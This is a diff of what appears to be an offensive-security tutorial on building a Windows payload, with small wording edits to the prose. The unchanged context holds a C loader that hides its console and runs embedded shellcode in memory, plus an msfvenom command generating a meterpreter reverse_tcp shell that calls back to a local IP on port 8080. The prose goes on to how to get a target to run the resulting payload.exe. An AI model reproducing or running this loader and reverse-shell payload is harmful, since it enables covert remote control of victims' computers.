@@ -87,8 +87,8 @@ int main()
     AllocConsole();
     stealth = FindWindowA("ConsoleWindowClass", NULL);
     ShowWindow(stealth, SW_HIDE); //SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = Hide the console
-    // msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.104 LPORT=8080 -f c
     // Paste your meterpreter/beacon shellcode here
+    // msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.104 LPORT=8080 -f c
     unsigned char shellcode[] =
         "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
         "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
@@ -123,7 +123,7 @@ int main()
 }
 ```
 
-This is a simple C code for in-memory shellcode execution that executes the shellcode which we generated before within the memory of the local process. It is pretty self-explanatory and the code is commented throughout so that there's no confusion as to what happens in each line. Follow the instructions commented at the top of the source and you should have a `payload.exe` in your current working directory.
+This is a simple C code for in-memory shellcode execution that executes the shellcode which we generated before within the memory space of the local process. It is pretty self-explanatory and the code is commented throughout so that there's no confusion as to what happens in each line. Follow the instructions commented at the top of the source and you should have a `payload.exe` in your current working directory.
 
 The size of the final payload should be around `13 kB` which is not bad.
 
@@ -138,7 +138,7 @@ This attack may also be done with Cobalt Strike and its _beacon_ payload.
 Okay you have created the payload but now what? 
 
 You can't just give an EXE to a target and hope for him/her to double-click on it right?
-Maybe that would have worked five-six decades ago but sure as hell no one's clicking on an unsigned, shady, standalone EXE payload without any reason now.
+Maybe that would have worked five-six decades ago but sure as hell no one's double-clicking on an unsigned, shady, standalone EXE payload without a compelling reason these days.
 
 
 
